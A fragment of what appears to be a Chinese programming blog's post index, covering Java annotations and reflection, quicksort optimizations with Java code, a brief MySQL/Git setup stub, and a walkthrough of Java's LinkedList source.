使用： 12345//有默认值的时候，可以不执行属性@TestAnnotation(id=3,msg="hello annotation")public class Test &#123;&#125; 有一些规则： 修饰符只能是public 或默认(default) 参数成员只能用基本类型byte,short,int,long,float,double,boolean八种基本类型和String,Enum,Class,annotations及这些类型的数组 如果只有一个参数成员,最好将名称设为”value” 注解元素必须有确定的值,可以在注解中定义默认值,也可以使用注解时指定,非基本类型的值不可为null,常使用空字符串或0作默认值 在表现一个元素存在或缺失的状态时,定义一下特殊值来表示,如空字符串或负值 Java 预置的注解 @Deprecated 这个元素是用来标记过时的元素，想必大家在日常开发中经常碰到。编译器在编译阶段遇到这个注解时会发出提醒警告，告诉开发者正在调用一个过时的元素比如过时的方法、过时的类、过时的成员变量。 @Override 这个大家应该很熟悉了，提示子类要复写父类中被 @Override 修饰的方法 @SuppressWarnings 阻止警告的意思。之前说过调用被 @Deprecated 注解的方法后，编译器会警告提醒，而有时候开发者会忽略这种警告，他们可以在调用的地方通过 @SuppressWarnings 达到目的。 @SafeVarargs 参数安全类型注解。它的目的是提醒开发者不要用参数做一些不安全的操作,它的存在会阻止编译器产生 unchecked 这样的警告。 @FunctionalInterface 函数式接口注解，这个是 Java 1.8 版本引入的新特性。函数式编程很火，所以 Java 8 也及时添加了这个特性。 函数式接口 (Functional Interface) 就是一个具有一个方法的普通接口。 123456789101112131415@FunctionalInterfacepublic interface Runnable &#123; /** * When an object implementing interface &lt;code&gt;Runnable&lt;/code&gt; is used * to create a thread, starting the thread causes the object's * &lt;code&gt;run&lt;/code&gt; method to be called in that separately executing * thread. * &lt;p&gt; * The general contract of the method &lt;code&gt;run&lt;/code&gt; is that it may * take any action whatsoever. * * @see java.lang.Thread#run() */ public abstract void run();&#125; 我们进行线程开发中常用的 Runnable 就是一个典型的函数式接口，上面源码可以看到它就被 @FunctionalInterface 注解。 可能有人会疑惑，函数式接口标记有什么用，这个原因是函数式接口可以很容易转换为 Lambda 表达式。 注解与反射 注解通过反射获取。首先可以通过 Class 对象的 isAnnotationPresent() 方法判断它是否应用了某个注解 1public boolean isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass) &#123;&#125; 然后通过 getAnnotation() 方法来获取 Annotation 对象。 1public &lt;A extends Annotation&gt; A getAnnotation(Class&lt;A&gt; annotationClass) &#123;&#125; 或者是 getAnnotations() 方法。 1public Annotation[] getAnnotations() &#123;&#125; 这里举个例子： 首先定义一个注解： 123456789@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface TestAnnotation &#123; public int id() default -1; public String msg() default "Hi";&#125; 然后定义一个类，打上这个注解： 123@TestAnnotationpublic class Test &#123;&#125; 最后再main函数中拿到注解： 1234567891011121314public class Main4 &#123; public static void main(String[] args) &#123; //判断Test.class中是否存在TestAnnotation注解 boolean hasAnnotation = Test.class.isAnnotationPresent(TestAnnotation.class); if(hasAnnotation)&#123; System.out.println("注解存在..."); //从Test类中拿出TestAnnotation注解 TestAnnotation annotation = Test.class.getAnnotation(TestAnnotation.class); //拿到注解之后，可以拿出注解中的属性对应的默认值 System.out.println(annotation.id()); System.out.println(annotation.msg()); &#125; &#125;&#125; 上面演示的是从类上拿到注解，对于属性、方法同样都可以用反射拿到注解。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Test &#123; @Check(value="hi") int a; @Perform public void testMethod()&#123;&#125; public static void main(String[] args) &#123; try &#123;/*************拿到属性上的注解****************/ Field a = Test.class.getDeclaredField("a"); a.setAccessible(true); //获取一个成员变量上的注解 Check check = a.getAnnotation(Check.class); if ( check != null ) &#123; System.out.println("check value:"+check.value()); &#125;/*************拿到方法上的注解****************/ Method testMethod = Test.class.getDeclaredMethod("testMethod"); if ( testMethod != null ) &#123; // 获取方法中的注解 Annotation[] ans = testMethod.getAnnotations(); for( int i = 0;i &lt; ans.length;i++) &#123; System.out.println("method testMethod annotation:"+ans[i].annotationType().getSimpleName()); &#125; &#125; &#125; catch (NoSuchFieldException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); System.out.println(e.getMessage()); &#125; catch (SecurityException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); System.out.println(e.getMessage()); &#125; catch (NoSuchMethodException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); System.out.println(e.getMessage()); &#125; &#125;&#125; 注解实现原理在上面获取注解时是这样写的： 1TestAnnotation annotation = Test.class.getAnnotation(TestAnnotation.class); 它是从class中获取出TestAnnotation注解的，所以肯定是在某个时候注解被加入到class结构中去了。 首先，我们知道从java源码到class字节码是由编译器完成的，编译器会对java源码进行解析并生成class文件。 而注解也是在编译时由编译器进行处理，编译器会对注解符号处理并附加到class结构中 根据jvm规范，class文件结构是严格有序的格式，唯一可以附加信息到class结构中的方式就是保存到class结构的attributes属性中 我们知道对于类、字段、方法，在class结构中都有自己特定的表结构，而且各自都有自己的属性，而对于注解，作用的范围也可以不同，可以作用在类上，也可以作用在字段或方法上，这时编译器会对应将注解信息存放到类、字段、方法自己的属性上。 在我们的Test类被编译后，在对应的Test.class文件中会包含一个RuntimeVisibleAnnotations属性，由于这个注解是作用在类上，所以此属性被添加到类的属性集上。即TestAnnotation注解的键值对value=test会被记录起来。 而当JVM加载Test.class文件字节码时，就会将RuntimeVisibleAnnotations属性值保存到Test的Class对象中，于是就可以通过Test.class.getAnnotation(TestAnnotation.class)获取到Test注解对象，进而再通过Test注解对象获取到Test里面的属性值。 Test注解对象是什么？其实注解被编译后的本质就是一个继承Annotation接口的接口。所以@TestAnnotation其实就是“public interface TestAnnotation extends Annotation” 当我们通过Test.class.getAnnotation(TestAnnotation.class)调用时，JDK会通过动态代理生成一个实现了TestAnnotation接口的对象，并把将RuntimeVisibleAnnotations属性值设置进此对象中，此对象即为TestAnnotation注解对象，通过它的value()方法就可以获取到注解值。 总结注解到底是什么以及注解到底有什么应用场景注释是给人看的，注解是给编译器看的，以@Override注解为例，他的作用是告诉编译器他所注解的方法是重写父类中的方法，这样编译器就会去检查父类是否存在这个方法，以及这个方法的签名与父类是否相同。 注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用； 也就是说，注解只是描述java代码的代码，能被编译器解析，只有编译器或者虚拟机来主动解析他的时候，他才可能发挥作用。 注解分为三类，元注解，java自带的标准注解以及自定义注解。 注解的使用场景： 生成文档，通过代码里标识的元数据生成javadoc文档。 编译检查，通过代码里标识的元数据让编译器在编译期间进行检查验证。 编译时动态处理，编译时通过代码里标识的元数据动态处理，例如动态生成代码。 运行时动态处理，运行时通过代码里标识的元数据动态处理，例如使用反射注入实例。 我觉得这些说的太空洞了，注解在spring中就是非常常用的技术，比如，我指定这个类是@Controller或者@Service之类，那么我配置包扫描将其类路径全部扫描到后，启动容器的时候，这些类就会自动被spring所管理，即自动向spring注册，以后要注入这些组件的时候，就直接从spring的IOC容器中取出来即可。 注解的使用是非常方便的，他的底层是利用它反射拿到注解对象，这个注解对象其实是一个实现了TestAnnotation接口的代理对象，将值设置在这个代理对象中，以后获取就可以通过这个代理对象拿到属性值。]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3、快速排序及优化]]></title>
    <url>%2F2018%2F07%2F21%2F3%E3%80%81%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E5%8F%8A%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[快速排序 1. 什么是快速排序？ 快速排序由C. A. R. Hoare在1962年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。 2. 排序所需要用到的公共方法1234567891011121314151617181920212223242526272829303132333435363738394041//为了缩减内容，同意的东西写在这里/**打印数组*/private static void printArr(int[] arr) &#123; for (int i=0; i&lt;arr.length; i++) &#123; System.out.print(arr[i]); System.out.print("\t"); &#125; System.out.println();&#125;/**交换数组两个元素*/public static void swap(int[] arr, int i, int j) &#123; if (i != j) &#123; int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125;&#125;/**main方法调用进行测试*/public static void main(String args[]) &#123; int[] arr = &#123;3, 5, 1, 7, 2, 9, 8, 0, 4, 6&#125;; printArr(arr);//3 5 1 7 2 9 8 0 4 6 sort(arr); printArr(arr);//0 1 2 3 4 5 6 7 8 9&#125;/**初始值传入*/public static void sort(int[] arr) &#123; sort(arr, 0, arr.length - 1);&#125; 3. 正宗的基本快速排序基础方法核心思想 找一个基准值base，然后一趟排序后让base左边的数都小于base，base右边的数都大于等于base。再分为两个子数组的排序。如此递归下去。 原理图 基准元素不动，后面i一直与基准的进行比较，将小于基准和大于基准的分为两队，最后将基准元素放到了他应该放的地方。 代码实现123456789101112131415161718192021222324252627282930313233343536public class QuickSort &#123; //递归排序 public static void sort(int[] arr, int left, int right) &#123; if (left &gt;= right) return; int p = partition(arr, left, right); sort(arr, left, p - 1); sort(arr, p + 1, right); &#125; //排序的核心方法 private static int partition(int[] arr, int left, int right) &#123; int base = arr[left];//用子表的第一个记录做基准 int j = left; for (int i = left + 1; i &lt;= right; i++) &#123; if (base &gt; arr[i]) &#123; j++; swap(arr, j, i); &#125; &#125; swap(arr, left, j); return j;//返回一躺排序后基准值的下角标 &#125; //交换数组 swap(int[] arr, int i, int j) &#123;...&#125; //打印数组 printArr(int[] arr) &#123;...&#125; //启动测试 main&#123;...&#125; //初始值传入 sort(int[] arr) &#123;...&#125; &#125; 存在的问题 在数组几乎有序时，快排性能不好（因为每趟排序后，左右两个子递归规模相差悬殊，大的那部分最后很可能会达到O(n^2)）。可以想象，对于一个有序数组或者近乎有序的数组，取了最左边的数为基准数，那么划分下来的情况就是，小于这个基准数的不存在，而大于这个基准数为整个数组，那么就会退化到n^2级别，效率极低。 4. 正宗的快速排序基础方法面对(近乎)有序数组的优化核心思想 基准值随机地选取，而不是每次都取第一个数。这样就不会受“几乎有序的数组”的干扰了。但是对“几乎乱序的数组”的排序性能可能会稍微下降，至少多了排序前交换的那部分，乱序时这个交换没有意义…有很多“运气”成分.. 代码实现12345678910111213141516171819202122232425262728293031323334353637public class QuickSort02 &#123; public static void sort(int[] arr, int left, int right) &#123; if (left &gt;= right) return; int p = partition(arr, left, right); sort(arr, left, p - 1); sort(arr, p + 1, right); &#125; private static int partition(int[] arr, int left, int right) &#123; //排序前，先让基准值和随机的一个数进行交换。这样，基准值就有随机性。 //就不至于在数组相对有序时，导致左右两边的递归规模不一致，产生最坏时间复杂度 swap(arr,left,(int)(Math.random()*(right - left + 1)+left)); int base = arr[left]; int j = left; for (int i = left + 1; i &lt;= right; i++) &#123; if (base &gt; arr[i]) &#123; j++; swap(arr, j, i); &#125; &#125; swap(arr, left, j); return j;//返回一躺排序后，基准值的下角标 &#125; //交换数组 swap(int[] arr, int i, int j) &#123;...&#125; //打印数组 printArr(int[] arr) &#123;...&#125; //启动测试 main&#123;...&#125; //初始值传入 sort(int[] arr) &#123;...&#125;&#125; 5.结合插入排序对其再优化核心思想 快排是不断减小问题规模来解决子问题的，需要不断递归。但是递归到规模足够小时，如果继续采用这种 不稳定+递归 的方式执行下去，效率不见得会很好。 所以当问题规模较小时，近乎有序时，插入排序表现的很好。Java自带的Arrays.sort()里经常能看到这样的注释：“Use insertion sort on tiny arrays”，“Insertion sort on smallest arrays” 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class QuickSort03 &#123; public static void sort(int[] arr) &#123; sort(arr, 0, arr.length - 1, 16);//在16个数以内时，用插入排序 &#125; /** * @param arr 待排序的数组 * @param left 左闭 * @param right 右闭 * @param k 当快排递归到子问题的规模 &lt;= k 时，采用插入排序优化 */ public static void sort(int[] arr, int left, int right, int k) &#123; // 规模小时采用插入排序 if (right - left &lt;= k) &#123; insertionSort(arr, left, right); return; &#125; int p = partition(arr, left, right); sort(arr, left, p - 1, k); sort(arr, p + 1, right, k); &#125; public static void insertionSort(int[] arr, int l, int r) &#123; for (int i = l + 1; i &lt;= r; i++) &#123; int cur = arr[i]; int j = i - 1; for (; j &gt;= 0 &amp;&amp; cur &lt; arr[j]; j--) &#123; arr[j + 1] = arr[j]; &#125; arr[j + 1] = cur; &#125; &#125; private static int partition(int[] arr, int left, int right) &#123; //排序前，先让基准值和随机的一个数进行交换。这样，基准值就有随机性。 //就不至于在数组相对有序时，导致左右两边的递归规模不一致，产生最坏时间复杂度 swap(arr, left, (int) (Math.random() * (right - left + 1) + left)); int base = arr[left]; int j = left; for (int i = left + 1; i &lt;= right; i++) &#123; if (base &gt; arr[i]) &#123; j++; swap(arr, j, i); &#125; &#125; swap(arr, left, j); return j;//返回一躺排序后，基准值的下角标 &#125; //交换数组 swap(int[] arr, int i, int j) &#123;...&#125; //打印数组 printArr(int[] arr) &#123;...&#125; //启动测试 main&#123;...&#125;&#125; 存在的问题 在最开始的普通快速排序说过，让基准值base左边的都比base小，而base右边的都大于等于base。等于base的这些会聚集到右侧(或者稍微改改大小关系就会聚集到左侧)。总之就会聚集到一边。这样在数组中重复数字很多的时候，就又会导致两边子递归规模差距悬殊的情况。严重的情况，算法复杂度就又会降低到n^2级别了。 6. 两路快排，将重复元素分布均匀一些核心思想 这时想把等于base的那些数分派到base两边，而不是让他们聚集到一起。 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374public class QuickSort04 &#123; public static void sort(int[] arr) &#123; sort(arr, 0, arr.length - 1, 16); &#125; /** * @param arr 待排序的数组 * @param left 左闭 * @param right 右闭 * @param k 当快排递归到子问题的规模 &lt;= k 时，采用插入排序优化 */ public static void sort(int[] arr, int left, int right, int k) &#123; // 规模小时采用插入排序 if (right - left &lt;= k) &#123; insertionSort(arr, left, right); return; &#125; if (left &gt;= right) return; int p = partition(arr, left, right); sort(arr, left, p - 1, k); sort(arr, p + 1, right, k); &#125; public static void insertionSort(int[] arr, int l, int r) &#123; for (int i = l + 1; i &lt;= r; i++) &#123; int cur = arr[i]; int j = i - 1; for (; j &gt;= 0 &amp;&amp; cur &lt; arr[j]; j--) &#123; arr[j + 1] = arr[j]; &#125; arr[j + 1] = cur; &#125; &#125; private static int partition(int[] arr, int left, int right) &#123; //排序前，先让基准值和随机的一个数进行交换。这样，基准值就有随机性。 //就不至于在数组相对有序时，导致左右两边的递归规模不一致，产生最坏时间复杂度 swap(arr, left, (int) (Math.random() * (right - left + 1) + left)); int base = arr[left];//基准值，每次都把这个基准值抛出去，看成[left+1.....right]左闭右闭区间的排序 int i = left + 1; //对于上一行提到的[left+1.....right]区间，i表示 [left+1......i)左闭右开区间的值都小于等于base。 int j = right;//对于上二行提到的[left+1.....right]区间，j表示 (j......right]左开右闭区间的值都大于等于base。 while (true) &#123; //从左到右扫描，扫描出第一个比base大的元素，然后i停在那里。 while (i &lt;= right &amp;&amp; arr[i] &lt; base) i++; //从右到左扫描，扫描出第一个比base小的元素，然后j停在那里。 while (j &gt;= left &amp;&amp; arr[j] &gt; base) j--; if (i &gt; j) &#123;//虽说是i&gt;j，但其实都是以j=i-1为条件结束的 break; &#125; swap(arr, i++, j--); &#125; swap(arr, left, j); return j;//返回一躺排序后，基准值的下角标 &#125; //交换数组 swap(int[] arr, int i, int j) &#123;...&#125; //打印数组 printArr(int[] arr) &#123;...&#125; //启动测试 main&#123;...&#125;&#125; 看不懂啥意思？点开链接就看懂了。啊哈磊–【坐在马桶上看算法】算法3：最常用的排序——快速排序 6. 两路快排–挖洞法核心思想 上面的两路在找到大于base的值和小于base的值时，用的是swap()方法来进行交换。两数交换涉及到第三个变量temp的操作，多了读写操作。接下来用直接赋值的方法，把小于的放到右边，大于的放到左边，当i和j相遇时，那个位置就是base该放的地方。至此一趟完成。递归即可。 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889public class QuickSort05 &#123; public static void sort(int[] arr) &#123; sort(arr, 0, arr.length - 1, 16); &#125; /** * @param arr 待排序的数组 * @param left 左闭 * @param right 右闭 * @param k 当快排递归到子问题的规模 &lt;= k 时，采用插入排序优化 */ public static void sort(int[] arr, int left, int right, int k) &#123; // 规模小时采用插入排序 if (right - left &lt;= k) &#123; insertionSort(arr, left, right); return; &#125; if (left &gt;= right) return; int p = partition(arr, left, right); sort(arr, left, p - 1, k); sort(arr, p + 1, right, k); &#125; public static void insertionSort(int[] arr, int l, int r) &#123; for (int i = l + 1; i &lt;= r; i++) &#123; int cur = arr[i]; int j = i - 1; for (; j &gt;= 0 &amp;&amp; cur &lt; arr[j]; j--) &#123; arr[j + 1] = arr[j]; &#125; arr[j + 1] = cur; &#125; &#125; private static int partition(int[] arr, int left, int right) &#123; //排序前，先让基准值和随机的一个数进行交换。这样，基准值就有随机性。 //就不至于在数组相对有序时，导致左右两边的递归规模不一致，产生最坏时间复杂度 swap(arr, left, (int) (Math.random() * (right - left + 1) + left)); int base = arr[left];//基准值，每次都把这个基准值抛出去，看成[left+1.....right]左闭右闭区间的排序 int i = left; //对于上一行提到的[left+1.....right]区间，i表示 [left+1......i)左闭右开区间的值都小于等于base。 int j = right;//对于上二行提到的[left+1.....right]区间，j表示 (j......right]左开右闭区间的值都大于等于base。 while (i &lt; j) &#123; //从右到左扫描，扫描出第一个比base小的元素，然后j停在那里。 while (j &gt; i &amp;&amp; arr[j] &gt; base) j--; arr[i] = arr[j]; //从左到右扫描，扫描出第一个比base大的元素，然后i停在那里。 while (i &lt; j &amp;&amp; arr[i] &lt; base) i++; arr[j] = arr[i]; &#125; arr[j] = base; return j;//返回一躺排序后，基准值的下角标 &#125; public static void swap(int[] arr, int i, int j) &#123; if (i != j) &#123; int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; private static void printArr(int[] arr) &#123; for (int i=0; i&lt;arr.length; i++) &#123; System.out.print(arr[i]); System.out.print("\t"); &#125; System.out.println(); &#125; public static void main(String args[]) &#123; int[] arr = &#123;3, 5, 1, 7, 2, 9, 8, 0, 4, 6&#125;; printArr(arr);//3 5 1 7 2 9 8 0 4 6 sort(arr); printArr(arr);//0 1 2 3 4 5 6 7 8 9 &#125;&#125; 理解不了代码？跟我一样 ==，擦那空下面个链接吧。我暂且叫他挖洞法，不需要交换了，那就挖个洞来盛东西吧。挖洞二分快速排序法 7. 当大量数据，且重复数多时，用三路快排核心思想 把数组分为三路，第一路都比base小，第二路都等于base，第三路都大于base。 用指针从前到后扫描，如果： cur指向的数小于base，那么：交换arr[cur]和arr[i]的值，然后i++,cur++。 cur指向的数等于base, 那么：cur++ cur指向的数大于base，那么：交换arr[cur]和arr[j]的值，然后j–。 当cur &gt; j的时候说明三路都已经完成。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475public class QuickSort06 &#123; public static void sort(int[] arr) &#123; sort(arr, 0, arr.length - 1, 16); &#125; /** * @param arr 待排序的数组 * @param left 左闭 * @param right 右闭 * @param k 当快排递归到子问题的规模 &lt;= k 时，采用插入排序优化 */ public static void sort(int[] arr, int left, int right, int k) &#123; // 规模小时采用插入排序 if (right - left &lt;= k) &#123; insertionSort(arr, left, right); return; &#125; if (left &gt;= right) return; int[] ret = partition(arr, left, right); sort(arr, left, ret[0], k); sort(arr, ret[1], right, k); &#125; public static void insertionSort(int[] arr, int l, int r) &#123; for (int i = l + 1; i &lt;= r; i++) &#123; int cur = arr[i]; int j = i - 1; for (; j &gt;= 0 &amp;&amp; cur &lt; arr[j]; j--) &#123; arr[j + 1] = arr[j]; &#125; arr[j + 1] = cur; &#125; &#125; /** * @param arr 待排序的数组 * @param left 待排序数组的左边界 * @param right 待排序数组的右边界 * @param &lt;T&gt; 泛型 * @return */ private static int[] partition(int[] arr, int left, int right) &#123; //排序前，先让基准值和随机的一个数进行交换。这样，基准值就有随机性。 //就不至于在数组相对有序时，导致左右两边的递归规模不一致，产生最坏时间复杂度 swap(arr, left, (int) (Math.random() * (right - left + 1) + left)); int base = arr[left];//基准值，每次都把这个基准值抛出去，看成[left+1.....right]左闭右闭区间的排序 //三路快排分为下面这三个路(区间) int i = left; // left表示，[lleft...left) 左闭右开区间里的数都比base小 int j = right;// left表示，(rright...right] 左开右闭区间里的数都比base大 int cur = i;//用cur来遍历数组。[left...cur)左闭右开区间里的数都等于base while (cur &lt;= j) &#123; if (arr[cur] == base) &#123; cur++; &#125; else if (arr[cur] &lt; base) &#123; swap(arr, cur++, i++); &#125; else &#123; swap(arr, cur, j--); &#125; &#125; return new int[]&#123;i - 1, j + 1&#125;;//[i...j]都等于base,子问题就只需要解决i左边和j右边就行了 &#125; //交换数组 swap(int[] arr, int i, int j) &#123;...&#125; //打印数组 printArr(int[] arr) &#123;...&#125; //启动测试 main&#123;...&#125;&#125; 8. 参考 http://www.cnblogs.com/noKing/archive/2017/11/29/7922397.html]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3、mysql+git安装]]></title>
    <url>%2F2018%2F07%2F21%2F3%E3%80%81mysql%2Bgit%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[继续安装mysql和git. 基于virtualbox+centos6.9的服务器搭建（二）—&gt;基于virtualbox+centos6.9的服务器搭建（二）]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3、LinkedList源码分析]]></title>
    <url>%2F2018%2F07%2F21%2F3%E3%80%81LinkedList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析LinkedList源码。 关注点 结论 LinkedList是否允许空 允许 LinkedList是否允许重复数据 允许 LinkedList是否有序 有序 LinkedList是否线程安全 非线程安全 一、概述1. 双向链表 链表中任意一个存储单元都可以通过向前或者向后寻址的方式获取到其前一个存储单元和其后一个存储单元 链表的尾节点的后一个节点是链表的头结点，链表的头结点的前一个节点是链表的尾节点 2. LinkedList简介123public class LinkedList&lt;E&gt; extends AbstractSequentialList&lt;E&gt; implements List&lt;E&gt;, Deque&lt;E&gt;, Cloneable, java.io.Serializable LinkedList 是一个继承于AbstractSequentialList的双向链表。它也可以被当作堆栈、队列或双端队列进行操作。 LinkedList 实现 List 接口，能对它进行队列操作。 LinkedList 实现 Deque 接口，即能将LinkedList当作双端队列使用。 LinkedList 实现了Cloneable接口，即覆盖了函数clone()，能克隆。 LinkedList 实现java.io.Serializable接口，这意味着LinkedList支持序列化，能通过序列化去传输。 LinkedList 是非同步的。 LinkedList相对于ArrayList来说，是可以快速添加，删除元素，ArrayList添加删除元素的话需移动数组元素，可能还需要考虑到扩容数组长度。 3. LinkedList属性 123456//链表的节点个数.transient int size = 0;//Pointer to first node.transient Node&lt;E&gt; first;//Pointer to last node.transient Node&lt;E&gt; last; 4. Node的结构1234567891011private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next;//后置指针 Node&lt;E&gt; prev;//前置指针 Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125;&#125; 二、添加元素1. LinkedList表头添加一个元素 当向表头插入一个节点时，很显然当前节点的前驱一定为 null，而后继结点是 first 指针指向的节点，当然还要修改 first 指针指向新的头节点。除此之外，原来的头节点变成了第二个节点，所以还要修改原来头节点的前驱指针，使它指向表头节点，源码的实现如下： 1234567891011121314151617public void addFirst(E e) &#123; linkFirst(e);&#125;private void linkFirst(E e) &#123; final Node&lt;E&gt; f = first; //新节点前置指针指向空，后置指针指向first节点 final Node&lt;E&gt; newNode = new Node&lt;&gt;(null, e, f); //新节点作为新的first节点 first = newNode; if (f == null) last = newNode;//初始就是个空LinkedList的话，last指向当前新节点 else f.prev = newNode;//初始值不为空，将其前置指针指向新节点 size++; modCount++;&#125; 2. LinkedList表尾添加一个元素 当向表尾插入一个节点时，很显然当前节点的后继一定为 null，而前驱结点是 last 指针指向的节点，然后还要修改 last 指针指向新的尾节点。此外，还要修改原来尾节点的后继指针，使它指向新的尾节点，源码的实现如下： 123456789101112131415161718public void addLast(E e) &#123; linkLast(e);&#125;void linkLast(E e) &#123; final Node&lt;E&gt; l = last; //新节点前置指针指向空，后置指针指向first节点 final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); //新节点作为新的last节点 last = newNode; //如果原来有尾节点，则更新原来节点的后继指针，否则更新头指针 if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; 3. LinkedList在指定节点前添加一个元素12345678910111213141516171819202122232425262728293031323334public void add(int index, E element) &#123; //判断数组是否越界 checkPositionIndex(index); if (index == size) linkLast(element);//直接插在最后一个 else linkBefore(element, node(index));//在index节点之前插入&#125;private void checkPositionIndex(int index) &#123; if (!isPositionIndex(index)) throw new IndexOutOfBoundsException(outOfBoundsMsg(index));&#125;private boolean isPositionIndex(int index) &#123; return index &gt;= 0 &amp;&amp; index &lt;= size;&#125;void linkBefore(E e, Node&lt;E&gt; succ) &#123; // assert succ != null; //找到索引位置的前面一个元素pred final Node&lt;E&gt; pred = succ.prev; //新节点，前置指针指向pred,后置指针指向索引处元素 final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ); //修改索引出元素的前置指针为新节点 succ.prev = newNode; if (pred == null) first = newNode;//说明是插在表头 else pred.next = newNode;//说明是插在非表头位置，修改pred后置指针为新指针 size++; modCount++;&#125; 三、删除元素 删除操作与添加操作大同小异，例如删除指定节点的过程如下图所示，需要把当前节点的前驱节点的后继修改为当前节点的后继，以及当前节点的后继结点的前驱修改为当前节点的前驱 与添加元素过程相反，这里简单注释一下源码。 1234567891011121314151617181920212223//删除表头的元素并返回public E removeFirst() &#123; final Node&lt;E&gt; f = first; if (f == null) throw new NoSuchElementException(); return unlinkFirst(f);&#125;private E unlinkFirst(Node&lt;E&gt; f) &#123; // assert f == first &amp;&amp; f != null; final E element = f.item; final Node&lt;E&gt; next = f.next;//获取第二个节点 f.item = null; f.next = null; // help GC 垃圾回收 first = next;//头指针指向后一个节点 if (next == null) last = null;//空表的情况 else next.prev = null;//非空表，修改next前置指针为空 size--; modCount++; return element;&#125; 1234567891011121314151617181920212223//删除表尾的元素并返回public E removeLast() &#123; final Node&lt;E&gt; l = last; if (l == null) throw new NoSuchElementException(); return unlinkLast(l);&#125;private E unlinkLast(Node&lt;E&gt; l) &#123; // assert l == last &amp;&amp; l != null; final E element = l.item; final Node&lt;E&gt; prev = l.prev;//获取倒数第二个节点 l.item = null; l.prev = null; // help GC last = prev;//尾指针指向倒数第二个节点 if (prev == null) first = null;//空表的情况 else prev.next = null;//修改prev的后置指针为空 size--; modCount++; return element;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041//删除指定索引处的元素并返回public E remove(int index) &#123; //检查索引是否越界 checkElementIndex(index); return unlink(node(index));&#125;private void checkElementIndex(int index) &#123; if (!isElementIndex(index)) throw new IndexOutOfBoundsException(outOfBoundsMsg(index));&#125;private boolean isElementIndex(int index) &#123; return index &gt;= 0 &amp;&amp; index &lt; size;&#125;E unlink(Node&lt;E&gt; x) &#123; // assert x != null; final E element = x.item; final Node&lt;E&gt; next = x.next;//获取索引元素的后一个元素 final Node&lt;E&gt; prev = x.prev;//获取索引元素的前一个元素 if (prev == null) &#123; first = next;//prev为空，说明索引索引是头节点，那么next节点就应该成为新的first &#125; else &#123; prev.next = next;//修改prev后置指针指向next节点 x.prev = null;//修改索引元素的前置指针 &#125; if (next == null) &#123; last = prev;//说明索引元素是尾节点，此时last为索引的前一个节点 &#125; else &#123; next.prev = prev;//修改next节点的前置指针指向prev x.next = null;//修改索引元素的后置指针 &#125; x.item = null;//释放索引的数据 size--;//长度减一 modCount++;//操作数加一 return element;&#125; 四、获取元素123456789101112131415161718192021//获取第一个元素public E getFirst() &#123; final Node&lt;E&gt; f = first; if (f == null) throw new NoSuchElementException(); return f.item;&#125;//获取最后一个元素public E getLast() &#123; final Node&lt;E&gt; l = last; if (l == null) throw new NoSuchElementException(); return l.item;&#125;//获取指定索引对应的元素public E get(int index) &#123; checkElementIndex(index); return node(index).item;&#125; 1234567891011121314151617//寻找元素的方向是根据index在表中的位置决定的Node&lt;E&gt; node(int index) &#123; // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) &#123;//索引小于表长的一半，从表头开始往后找 Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123;//索引大于表长的一半，从表尾往前开始找 Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125;&#125; 五、其他方法1. set方法12345678//将指定位置的元素修改public E set(int index, E element) &#123; checkElementIndex(index); Node&lt;E&gt; x = node(index);//根据index找到对应的元素 E oldVal = x.item;//保存旧的值 x.item = element;//设置新的值 return oldVal;//返回旧的值&#125; 2. 删除指定元素123456789101112131415161718public boolean remove(Object o) &#123; if (o == null) &#123;//删除null的元素 for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (x.item == null) &#123; unlink(x); return true; &#125; &#125; &#125; else &#123;//遍历 for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (o.equals(x.item)) &#123; unlink(x); return true; &#125; &#125; &#125; return false;&#125; 3. 获取指定下标的元素1234public E get(int index) &#123; checkElementIndex(index); //先检查是否越界 return node(index).item;&#125; 4.获取表头节点的值，表头为空返回null1234public E peek() &#123; final Node&lt;E&gt; f = first; return (f == null) ? null : f.item;&#125; 5.获取表头节点的值，并删除表头节点，表头为空返回null1234public E poll() &#123; final Node&lt;E&gt; f = first; return (f == null) ? null : unlinkFirst(f);&#125; 六、总结 1、理论上无容量限制，只受虚拟机自身限制影响，所以没有扩容方法。 